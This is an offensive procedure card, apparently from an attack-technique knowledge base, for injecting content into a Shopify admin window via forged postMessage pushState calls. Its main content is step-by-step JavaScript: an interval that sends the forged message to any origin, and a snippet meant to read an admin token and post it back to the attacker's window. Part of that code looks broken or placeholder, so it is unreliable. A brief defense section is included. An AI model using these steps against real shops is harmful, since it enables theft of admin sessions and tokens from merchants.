---
tags:
  - postmessage
  - xss
  - exfiltration
  - shopify
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a00f99c9-acfe-4450-a8d6-7b4e17df903e
created_at: '2025-12-14T17:30:07.272Z'
updated_at: '2025-12-14T17:30:07.272Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Manipulate-Admin-Page-State-with-postMessage

## Summary

This procedure uses cross-window postMessage to send manipulated state data to the opened admin window, exploiting invalid protocol filtering in Shopify.API.pushState to inject arbitrary content and exfiltrate sensitive data.

## Description

After opening the admin themes window, an interval sends postMessage events with a forged Shopify.API.pushState call, setting the pathname to 'invalid:pages/xss'. The filter fails to validate the 'invalid:' protocol, causing DOM injection of attacker-controlled content. This allows access to admin session elements, enabling theft of tokens and configurations via additional JS (e.g., sending back via postMessage or fetch).

## Requirements

1. Open admin themes window from prior trigger
2. Control over the originating window's JavaScript context
3. Target window not blocking postMessage from origin '*'

## Defense

Defensive measures and detection strategies:

- Validate all postMessage origins and payloads in Shopify.API handlers
- Filter protocols strictly in pushState, rejecting invalid ones like 'invalid:'
- Monitor for repeated postMessage intervals or pathname changes in admin logs

## Objectives

1. Bypass protocol filters to alter admin pathname
2. Inject and execute arbitrary JS in admin DOM
3. Collect and exfiltrate session data

## Instructions

### Step 1: Initiate postMessage Interval

**Context**: From the originating window, start sending messages to the new window to invoke the vulnerable pushState.

The attack function sets up:

```javascript
var interval = setInterval(function() {
  win.postMessage({message: 'Shopify.API.pushState', data: {pathname: 'invalid:pages/xss'}}, '*');
}, 100);
```

> Expected: Messages sent every 100ms. Monitor network tab for postMessage events.

### Step 2: Confirm Injection and Exfiltrate

**Context**: In the target window, the received message processes, injecting the 'invalid:pages/xss' content due to filter failure.

Extend payload to capture data:

```javascript
// Injected content: fetch sensitive elements and post back
document.addEventListener('message', function(e) {
  if (e.data.message === 'Shopify.API.pushState') {
    // Simulate pushState execution leading to DOM injection
    // Then: var token = document.querySelector('[data-token]').value;
    // opener.postMessage({stolen: token}, '*');
    window.attackSuccess = true;
  }
});
```

> Expected: Pathname updates, arbitrary content renders. Success if `attackSuccess` sets true and data is accessible (e.g., console.log(token)).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[postmessage]]
- [[xss]]
- [[Exfiltration]]
- [[shopify]]
